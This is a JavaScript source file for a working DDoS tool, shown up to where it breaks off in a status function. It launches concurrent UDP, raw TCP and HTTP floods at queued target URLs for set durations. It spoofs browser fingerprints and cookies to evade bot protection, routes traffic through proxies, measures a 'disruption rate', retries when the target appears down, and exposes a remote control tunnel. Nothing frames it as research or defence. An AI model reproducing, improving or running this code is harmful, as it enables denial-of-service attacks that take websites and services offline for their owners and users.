const express = require("express");
const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const net = require("net");
const dgram = require("dgram");

const { randomUserAgent } = require("random-headers");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { request: urequest, ProxyAgent } = require("undici");
const readline = require("readline");
require("dotenv").config();

const nport = require("./nport.js");


const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
const REQUEST_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 10000;
const USE_UDP = process.env.UDP_FLOOD !== "false";
const USE_RAW_TCP = process.env.RAW_TCP !== "false";
const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
const L7_BYPASS = process.env.L7_BYPASS !== "false";
const STOP_KEY = process.env.STOP_KEY || '';




process.on('uncaughtException', (err) => {
  try {
    saveNow();
    console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`));
  } catch {}
});

process.on('unhandledRejection', (reason) => {
  
  if (!reason || reason.code === 'UND_ERR_ABORTED' || reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') return;
  try { console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`)); } catch {}
  
});

const colors = {
  red: (t) => `\x1b[31m${t}\x1b[0m`,
  green: (t) => `\x1b[32m${t}\x1b[0m`,
  yellow: (t) => `\x1b[33m${t}\x1b[0m`,
  cyan: (t) => `\x1b[36m${t}\x1b[0m`,
  magenta: (t) => `\x1b[35m${t}\x1b[0m`,
  gray: (t) => `\x1b[90m${t}\x1b[0m`,
  bold: (t) => `\x1b[1m${t}\x1b[0m`,
};

const generateCacheBuster = () => `${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

const proxyFilePath = path.join(__dirname, "proxy.txt");
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function loadProxies() {
  try {
    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(l => l.trim()).filter(Boolean);
  } catch {
    return [];
  }
}

const getNoCacheHeaders = (forcedProfile) => {
  if (L7_BYPASS && browserProfiles) {
    const profile = forcedProfile || browserProfiles[profileIdxCounter++ % browserProfiles.length];
    return buildBrowserHeaders(profile);
  }
  return {
    "Cache-Control": "no-cache, no-store, max-age=0",
    Pragma: "no-cache",
    "User-Agent": randomUserAgent(),
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
  };
};

const httpAgent = KEEP_ALIVE ? new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256 }) : null;
const httpsAgent = KEEP_ALIVE ? new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256, rejectUnauthorized: false }) : null;



const browserProfiles = L7_BYPASS ? [
  { name: "chrome-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9" },
  { name: "chrome-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", secCHUA: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", acceptLang: "en-US,en;q=0.9" },
  { name: "firefox-win",  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "Windows", accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5" },
  { name: "firefox-mac",   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0", secCHUA: '', platform: "macOS",   accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", acceptLang: "en-US,en;q=0.5" },
] : null;




const browserAgents = L7_BYPASS ? browserProfiles.map(() => new https.Agent({
  keepAlive: KEEP_ALIVE,
  keepAliveMsecs: 1000,
  maxSockets: Infinity,
  maxFreeSockets: 256,
  rejectUnauthorized: false,
})) : null;

let profileIdxCounter = 0;

function getNextProfile() {
  if (!L7_BYPASS || !browserProfiles) return null;
  const idx = profileIdxCounter++ % browserProfiles.length;
  return { profile: browserProfiles[idx], agent: browserAgents[idx], idx };
}

function buildBrowserHeaders(profile) {
  const h = {
    "Accept": profile.accept,
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": profile.acceptLang,
    "Cache-Control": "no-cache, no-store, max-age=0",
    "Pragma": "no-cache",
    "Connection": KEEP_ALIVE ? "keep-alive" : "close",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": profile.userAgent,
  };
  
  if (profile.secCHUA) {
    h["Sec-CH-UA"] = profile.secCHUA;
    h["Sec-CH-UA-Mobile"] = "?0";
    h["Sec-CH-UA-Platform"] = `"${profile.platform}"`;
  }
  h["Sec-Fetch-Dest"] = "document";
  h["Sec-Fetch-Mode"] = "navigate";
  h["Sec-Fetch-Site"] = "none";
  h["Sec-Fetch-User"] = "?1";
  return h;
}


const cookieJar = L7_BYPASS ? new Map() : null;

function storeCookies(hostname, rawHeaders) {
  if (!cookieJar || !rawHeaders) return;
  const setCookie = rawHeaders["set-cookie"];
  if (!setCookie) return;
  const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
  if (!cookieJar.has(hostname)) cookieJar.set(hostname, {});
  const jar = cookieJar.get(hostname);
  for (const cookieStr of cookies) {
    const [nameValue] = cookieStr.split(";");
    const eqIdx = nameValue.indexOf("=");
    if (eqIdx > 0) jar[nameValue.slice(0, eqIdx).trim()] = nameValue.slice(eqIdx + 1).trim();
  }
}

function getCookies(hostname) {
  if (!cookieJar) return "";
  const jar = cookieJar.get(hostname);
  if (!jar) return "";
  const entries = Object.entries(jar);
  if (!entries.length) return "";
  return entries.map(([k, v]) => `${k}=${v}`).join("; ");
}


function getJitter() {
  if (!L7_BYPASS) return 0;
  return Math.floor(Math.random() * 150) + 50;
}




const udpSockets = new Set();

function udpFlood(targetIP, port, threadId) {
  const socket = dgram.createSocket("udp4");
  udpSockets.add(socket);
  const payload = Buffer.alloc(1400, "A");
  let sent = 0;
  let closed = false;
  const cleanup = () => {
    if (!closed) { closed = true; udpSockets.delete(socket); clearInterval(closeTimer); try { socket.close(); } catch {} }
  };
  const flood = () => {
    if (!continueAttack) { cleanup(); return; }
    for (let i = 0; i < 10; i++) {
      socket.send(payload, 0, payload.length, port, targetIP, (err) => {
        if (!err) sent++;
      });
    }
    if (continueAttack) setImmediate(flood);
  };
  setImmediate(flood);
  
  const closeTimer = setInterval(() => {
    if (!continueAttack) { clearInterval(closeTimer); cleanup(); }
  }, 5000);
  return () => sent;
}


function closeAllUdpSockets() {
  for (const sock of udpSockets) {
    try { sock.close(); } catch {}
  }
  udpSockets.clear();
}

function rawTCPFlood(host, port, threadId) {
  let sent = 0;
  const flood = () => {
    if (!continueAttack) return;
    for (let i = 0; i < 5; i++) {
      const socket = new net.Socket();
      socket.connect(port, host, () => {
        socket.write(`GET /${generateCacheBuster()} HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
        sent++;
        socket.destroy();
      });
      socket.on("error", () => {});
    }
    setImmediate(flood);
  };
  setImmediate(flood);
  return () => sent;
}

function socksRequest(url, agent, threadId) {
  return new Promise((resolve) => {
    const start = Date.now();
    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
      res.resume();
      
      if (res.statusCode !== 200 && Math.random() < 0.01) {
        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
      }
      lastSuccessTime = Date.now();
      resolve({ status: res.statusCode });
    });
    req.on("error", (err) => {
      
      if (Math.random() < 0.005) {
        try { console.error(colors.red(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${err.code || err.message}`)); } catch {}
      }
      resolve(null);
    });
    req.on("timeout", () => { req.destroy(); resolve(null); });
    req.end();
  });
}

function createContext(proxyLine) {
  if (!proxyLine) return { type: "direct" };
  const parts = proxyLine.split(":");
  if (parts[0].includes("socks")) {
    const host = parts[0].replace("socks5://", "").replace("socks4://", "");
    return { type: "socks", agent: new SocksProxyAgent(`socks5://${host}:${parts[1]}`) };
  }
  return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
}


const hostFailureCount = new Map();

let lastSuccessTime = Date.now();

const threadBackoff = new Map();
const threadTypes = new Map();

function countThreadTypes() {
  let direct = 0, proxy = 0;
  for (const t of threadTypes.values()) {
    if (t === "direct") direct++;
    else proxy++;
  }
  return { direct, proxy };
}

const fireHTTPRequest = (url, ctx, threadId) => {
  return new Promise((resolve) => {
    const start = Date.now();
    const parsedUrl = new URL(url);
    const host = parsedUrl.hostname;
    
    let agent;
    let profileData = null;
    if (L7_BYPASS && browserAgents && parsedUrl.protocol === "https:" && (!ctx || ctx.type === "direct")) {
      profileData = getNextProfile();
      agent = profileData.agent;
    } else {
      agent = parsedUrl.protocol === "https:" ? httpsAgent : httpAgent;
    }
    const headers = getNoCacheHeaders(profileData ? profileData.profile : null);
    
    if (L7_BYPASS) {
      const cookies = getCookies(host);
      if (cookies) headers["Cookie"] = cookies;
    }
    
    const failCount = hostFailureCount.get(host) || 0;
    if (failCount > 10) {
      headers["Connection"] = "close";
    }
    const options = {
      hostname: host,
      port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: "GET",
      headers,
      agent,
      timeout: REQUEST_TIMEOUT,
      rejectUnauthorized: false,
    };
    const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
      
      if (hostFailureCount.has(host)) hostFailureCount.delete(host);
      lastSuccessTime = Date.now();
      if (L7_BYPASS && res.headers) storeCookies(host, res.headers);
      res.resume();
      
      if (res.statusCode !== 200 && Math.random() < 0.005) {
        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
      }
      resolve({ status: res.statusCode });
    });
    req.on("error", (err) => {
      
      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
      
      if (Math.random() < 0.005) {
        try { console.error(colors.yellow(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${err.code || err.message}`)); } catch {}
      }
      resolve(null);
    });
    req.on("timeout", () => {
      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
      req.destroy();
      resolve(null);
    });
    req.end();
  });
};







let watchdogTimer = null;
let lastWatchdogReqCount = 0;
let watchdogStallCount = 0;




function destroyAllAgentSockets() {
  const agents = [];
  if (httpAgent) agents.push(httpAgent);
  if (httpsAgent) agents.push(httpsAgent);
  if (browserAgents) agents.push(...browserAgents);
  for (const agent of agents) {
    
    for (const key of Object.keys(agent.freeSockets || {})) {
      for (const socket of agent.freeSockets[key]) {
        try { socket.destroy(); } catch {}
      }
    }
    
    for (const key of Object.keys(agent.sockets || {})) {
      for (const socket of agent.sockets[key]) {
        try { socket.destroy(); } catch {}
      }
    }
  }
}

function startWatchdog() {
  stopWatchdog();
  lastWatchdogReqCount = totalRequestsSent + totalReqCount;
  watchdogStallCount = 0;
  watchdogTimer = setInterval(() => {
    const currentCount = totalRequestsSent + totalReqCount;
    if (continueAttack && currentTarget) {
      
      if (currentCount === lastWatchdogReqCount) {
        watchdogStallCount++;
        if (watchdogStallCount === 5) { 
          console.log(colors.yellow(`[Watchdog] 0 req/s for 5s — destroying stale sockets & resetting state...`));
          destroyAllAgentSockets();
          hostFailureCount.clear();
          threadBackoff.clear();
          closeAllUdpSockets();
          
        }
        if (watchdogStallCount >= 30) {
          console.log(colors.yellow(`[Watchdog] Server appears down for ${Math.round((Date.now() - lastSuccessTime)/1000)}s — threads backing off, will resume when server recovers`));
          watchdogStallCount = 0; 
        }
      } else {
        
        if (watchdogStallCount > 0) {
          console.log(colors.green(`[Watchdog] Traffic resumed after ${watchdogStallCount}s stall`));
        }
        watchdogStallCount = 0;
      }
      lastWatchdogReqCount = currentCount;
    }
  }, 1000);
}

function stopWatchdog() {
  if (watchdogTimer) {
    clearInterval(watchdogTimer);
    watchdogTimer = null;
  }
  watchdogStallCount = 0;
}






const stateFilePath = path.join(__dirname, "attackState.json");
let continueAttack = false;
let currentTarget = null;
let totalRequestsSent = 0;
let targetQueue = [];
let activeThreads = [];
let lastStatusLog = 0;
let nportUrl = null;
let tunnelActive = false;
let saveTimer = null;
let statusInterval = null;
let totalReqCount = 0;
let durationExpiryHandled = false;
const statusCounts = new Map();

const STATUS_LABELS = {
  200: "OK", 201: "Created", 204: "No Content",
  301: "Moved", 302: "Found", 304: "Not Mod",
  400: "Bad Req", 401: "Unauth", 403: "Forbidden", 404: "Not Found", 429: "Rate Limit",
  500: "Error", 501: "Not Impl", 502: "Bad Gateway", 503: "Unavail", 504: "Gateway Timeout", 505: "HTTP Ver",
  520: "Web Unknown", 521: "Web Down", 522: "Conn Timeout", 523: "Origin Unreach", 524: "Timeout", 525: "SSL Fail", 526: "Invalid SSL", 529: "Overload", 530: "Site Frozen",
};

function recordStatus(code) {
  const key = code ? String(code) : "error";
  statusCounts.set(key, (statusCounts.get(key) || 0) + 1);
}

function formatStatusLine() {
  const parts = [];
  const disruptionCodes = [400, 401, 403, 404, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524, 525, 526, 529, 530];
  const sorted = [...statusCounts.entries()]
    .filter(([code]) => code === "error" || code === "200" || disruptionCodes.includes(parseInt(code)))
    .sort((a, b) => b[1] - a[1]);
  for (const [code, count] of sorted.slice(0, 5)) {
    if (count === 0) continue;
    const n = parseInt(code);
    let color = colors.yellow;
    if (n >= 500) color = colors.red;
    else if (isNaN(n)) color = colors.gray;
    parts.push(`${code === "error" ? "ERR" : code}:${color(formatNumber(count))}`);
  }
  return parts.join(" ");
}

function getDisruptionRate() {
  const disruptionCodes = [403, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524, 525, 526, 529, 530];
  let total = 0, disruptions = 0;
  for (const [code, count] of statusCounts) {
    total += count;
    const n = parseInt(code);
    if (isNaN(n) || disruptionCodes.includes(n)) disruptions += count;
  }
  return { pct: total > 0 ? Math.round((disruptions / total) * 100) : 0, count: disruptions, total };
}

function formatStatusDetail() {
  const lines = [];
  const sorted = [...statusCounts.entries()]
    .map(([code, count]) => ({ code, count, num: parseInt(code) }))
    .sort((a, b) => b.count - a.count);
  for (const { code, count, num } of sorted) {
    const label = STATUS_LABELS[num] || "";
    const icon = isNaN(num) ? colors.gray("⚠") : (num >= 500 ? colors.red("✕") : num >= 400 ? colors.yellow("!") : colors.green("✓"));
    lines.push(`  ${icon} ${code === "error" ? "ERR" : code}${label ? ` ${colors.gray(label)}` : ""}: ${colors.bold(formatNumber(count))}`);
  }
  if (statusCounts.size > 0) {
    const dr = getDisruptionRate();
    const color = dr.pct > 50 ? colors.red : dr.pct > 20 ? colors.yellow : colors.green;
    lines.push(`  ${colors.bold("Disruption Rate:")} ${color(`${dr.pct}%`)} (${formatNumber(dr.count)}/${formatNumber(dr.total)} responses indicate service impairment)`);
  }
  return lines.join("\n");
}




function ensureStateFileExists() {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] }));
  }
}

function loadState() {
  ensureStateFileExists();
  try {
    return JSON.parse(fs.readFileSync(stateFilePath, "utf-8"));
  } catch {
    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  }
}

let state = loadState();
continueAttack = state.continueAttack;
currentTarget = state.currentTarget;
totalRequestsSent = state.totalRequests || 0;
targetQueue = state.queue || [];
if (state.statusCounts && typeof state.statusCounts === "object") {
  for (const [code, count] of Object.entries(state.statusCounts)) {
    statusCounts.set(code, count);
  }
}

if (currentTarget && currentTarget.startTime && Date.now() - currentTarget.startTime >= currentTarget.duration) {
  console.log(colors.yellow(`Target duration expired during downtime — resetting start time: ${currentTarget.url}`));
  currentTarget.startTime = Date.now();
}
if (!currentTarget && targetQueue.length > 0) {
  currentTarget = targetQueue.shift();
  console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
  totalRequestsSent = 0;
}
if (currentTarget === null) {
  continueAttack = false;
  totalRequestsSent = 0;
}
state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

function debouncedSave() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    state.continueAttack = continueAttack;
    state.currentTarget = currentTarget;
    state.queue = targetQueue;
    state.totalRequests = totalRequestsSent + totalReqCount;
    state.statusCounts = Object.fromEntries(statusCounts);
    fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
    saveTimer = null;
  }, 500);
}

function saveNow() {
  if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
  totalRequestsSent += totalReqCount;
  totalReqCount = 0;
  state.continueAttack = continueAttack;
  state.currentTarget = currentTarget;
  state.queue = targetQueue;
  state.totalRequests = totalRequestsSent;
  state.statusCounts = Object.fromEntries(statusCounts);
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
}

function resetTotal() {
  totalRequestsSent = 0;
  totalReqCount = 0;
  statusCounts.clear();
  state.totalRequests = 0;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
  console.log(colors.green("Total reset to 0"));
}



function startStatusDisplay() {
  if (statusInterval) clearInterval(statusInterval);
  statusInterval = setInterval(() => {
    const count = totalReqCount;
    totalRequestsSent += count;
    totalReqCount = 0;
    if (count > 0 || lastStatusLog > 0) {
      const wallPct = currentTarget ? Math.round(((Date.now() - currentTarget.startTime) / currentTarget.duration) * 100) : 0;
      const { direct, proxy } = countThreadTypes();
      const statusLine = formatStatusLine();
      const statusPart = statusLine ? ` | ${statusLine}` : '';
      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`D:${direct}`)} ${colors.yellow(`P:${proxy}`)} | ${colors.cyan(`T:${direct+proxy}`)}${statusPart} | ${colors.green(`${Math.min(100, wallPct)}%`)}`);
      debouncedSave();
    }
    lastStatusLog = Date.now();
  }, 1000);
}

function stopStatusDisplay() {
  if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
}

const addToQueue = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (targetQueue.length >= MAX_QUEUE) { console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`)); return false; }
  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  targetQueue.push(newTarget);
  state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
  saveNow();
  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
  return true;
};

const startAttack = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours); }

  resetTotal();
  targetQueue = [];

  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  continueAttack = true;
  durationExpiryHandled = false;
  state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
  saveNow();
  lastSuccessTime = Date.now();

  const proxies = loadProxies();

  console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
  if (proxies.length) console.log(colors.magenta(`Proxies: ${proxies.length} available — randomly mixed with direct connections`));
  if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
  if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
  if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
  if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
  console.log("");    activeThreads = [];
  threadTypes.clear();
  let threadId = 0;
  for (let i = 0; i < numThreads; i++) {
    if (!continueAttack) break;
    if (proxies.length && Math.random() < 0.5) {
      threadTypes.set(threadId, "proxy");
      performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++);
    } else {
      threadTypes.set(threadId, "direct");
      performAttackSingle(currentTarget, { type: "direct" }, threadId++);
    }
    activeThreads.push(i);
  }
  startWatchdog();
  startStatusDisplay();
  return true;
};



const performAttackSingle = async (target, ctx, threadId) => {
  let backoffDelay = 0;
  try {
    if (!continueAttack || !target) return;

    
    if (Date.now() - target.startTime >= target.duration) {
      
      if (target !== currentTarget) return;
      if (durationExpiryHandled) return;
      durationExpiryHandled = true;
      try {
        console.log(colors.green(`[Duration] ${Math.round(target.duration/60000)}min wall-clock reached — target complete`));
        if (targetQueue.length > 0) {
          currentTarget = targetQueue.shift();
          console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
          const nextTarget = currentTarget;
          resetTotal();
          state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue };
          saveNow();
          currentTarget = nextTarget;
          durationExpiryHandled = false;
          threadBackoff.clear();
          threadTypes.clear();
          const proxies = loadProxies();
          let nextThreadId = 0;
          for (let i = 0; i < numThreads; i++) {
            if (!continueAttack) break;
            if (proxies.length && Math.random() < 0.5) {
              threadTypes.set(nextThreadId, "proxy");
              performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++);
            } else {
              threadTypes.set(nextThreadId, "direct");
              performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++);
            }
          }
          console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
        } else {
          console.log(colors.yellow(`[!] Duration expired for ${target.url} — no more targets in queue, stopping attack`));
          continueAttack = false;
          currentTarget = null;
          resetTotal();
          state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
          saveNow();
          console.log(colors.yellow("All targets completed. Attack finished."));
        }
      } catch (err) {
        
        console.error(colors.red(`[!] DURATION HANDLER ERROR for ${target?.url}: ${err.message} — stopping attack`));
        console.error(colors.gray(`    Stack: ${err.stack?.split('\n').slice(0, 3).join('\n    ')}`));
        continueAttack = false;
        currentTarget = null;
        targetQueue = [];
        state = { continueAttack: false, currentTarget: null, totalRequests: totalRequestsSent, queue: [] };
        saveNow();
      }
      return;
    }

    
    if (USE_UDP) {
      const parsed = new URL(target.url);
      udpFlood(parsed.hostname, parsed.port || 80, threadId);
    }
    if (USE_RAW_TCP) {
      const parsed = new URL(target.url);
      rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
    }
    
    const startTime = Date.now();
    const promises = [];
    for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
      const cb = generateCacheBuster();
      const sep = target.url.includes("?") ? "&" : "?";
      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
      if (ctx.type === "socks") {
        promises.push(socksRequest(url, ctx.agent, threadId));
      } else if (ctx.type === "http") {
        promises.push(
          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
            .catch(() => null)
        );
      } else {
        promises.push(fireHTTPRequest(url, ctx, threadId));
      }
    }

    let successfulRequests = 0;
    try {
      const results = await Promise.allSettled(promises);
      for (const r of results) {
        if (r.status === "fulfilled" && r.value) {
          if (r.value.status) {
            successfulRequests++;
            recordStatus(r.value.status);
          } else {
            recordStatus(null);
          }
        } else {
          recordStatus(null);
        }
      }
    } catch {}

    totalReqCount += successfulRequests;
    totalRequestsSent += successfulRequests;
    debouncedSave();

    
    if (successfulRequests === 0 && REQUESTS_PER_CYCLE > 0) {
      let state = threadBackoff.get(threadId) || { consecutiveFailures: 0, backoffMs: 0 };
      state.consecutiveFailures++;
      state.backoffMs = Math.min(5000, Math.max(500, state.backoffMs * 2 || 500));
      threadBackoff.set(threadId, state);
      backoffDelay = state.backoffMs;
    } else {
      threadBackoff.delete(threadId);
    }

    
    
    if (ctx.type !== "direct") {
      if (successfulRequests === 0) {
        ctx.proxyFails = (ctx.proxyFails || 0) + 1;
        if (ctx.proxyFails >= 3) {
          console.log(colors.yellow(`[Thread ${threadId}] Proxy dead — falling back to direct connection`));
          ctx = { type: "direct" };
          threadTypes.set(threadId, "direct");
          threadBackoff.delete(threadId);
          backoffDelay = 0;
        }
      } else {
        ctx.proxyFails = 0;
      }
    }

    const duration = Date.now() - startTime;
    if (threadId === 0 && duration > 0) {
      const now = Date.now();
      if (now - lastStatusLog > 1000) {
        lastStatusLog = now;
        const rps = (successfulRequests / (duration / 1000)).toFixed(1);
        const backoffHint = successfulRequests === 0 ? ` ${colors.gray(`[backoff]`)}` : '';
        console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}${backoffHint}`);
      }
    }
  } catch (err) {
    try { console.error(colors.red(`[Thread ${threadId}] Attack error: ${err.message}`)); } catch {}
  }

  
  if (continueAttack) {
    const j = getJitter();
    const delay = backoffDelay > 0 ? backoffDelay : (j > 0 ? j : 0);
    if (delay > 0) setTimeout(() => performAttackSingle(target, ctx, threadId), delay);
    else setImmediate(() => performAttackSingle(target, ctx, threadId));
  }
};

const stopAttack = async () => {
  if (!continueAttack) { console.log(colors.yellow("No active attack")); return; }
  continueAttack = false;
  stopWatchdog();
  closeAllUdpSockets();
  stopStatusDisplay();
  activeThreads = [];
  threadTypes.clear();
  currentTarget = null;
  targetQueue = [];
  resetTotal();
  state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  saveNow();
  console.log(colors.yellow("\nAttack Stopped"));
  if (statusCounts.size > 0) {
    console.log(colors.cyan("\n=== FINAL RESPONSE STATUS ==="));
    console.log(formatStatusDetail());
    console.log("");
  }
  console.log(colors.green("Queue cleared. Total reset to 0\n"));
};

const resumeAttack = async () => {
  if (!continueAttack || !currentTarget) return;
  console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
  lastSuccessTime = Date.now();

  const proxies = loadProxies();

  
  console.log(colors.green(`\nAttack Resumed: ${currentTarget.url}`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
  if (proxies.length) console.log(colors.magenta(`Proxies: ${proxies.length} available — randomly mixed with direct connections`));
  if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
  if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
  if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
  if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
  console.log("");

  activeThreads = [];
  threadTypes.clear();
  let threadId = 0;

  for (let i = 0; i < numThreads; i++) {
    if (!continueAttack) break;
    if (proxies.length && Math.random() < 0.5) {
      threadTypes.set(threadId, "proxy");
      performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++);
    } else {
      threadTypes.set(threadId, "direct");
      performAttackSingle(currentTarget, { type: "direct" }, threadId++);
    }
    activeThreads.push(i);
  }
  console.log(colors.green(`Resumed with ${threadId} threads${proxies.length ? ' (direct + proxies mixed)' : ' (direct)'}`));
  startWatchdog();
  startStatusDisplay();
};

const autoStartTunnel = async () => {
  const tunnelSubdomain = process.env.NPORT || "ddos";
  console.log(colors.cyan(`Starting tunnel: ${tunnelSubdomain}`));
  try {
    const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: true });
    if (url) { nportUrl = url; tunnelActive = true; console.log(colors.green(`Tunnel active: ${nportUrl}`)); return true; }
    console.log(colors.red("Tunnel failed"));
    return false;
  } catch (err) {
    console.log(colors.red(`Tunnel error: ${err.message}`));
    return false;
  }
};

const showStatus = () => {
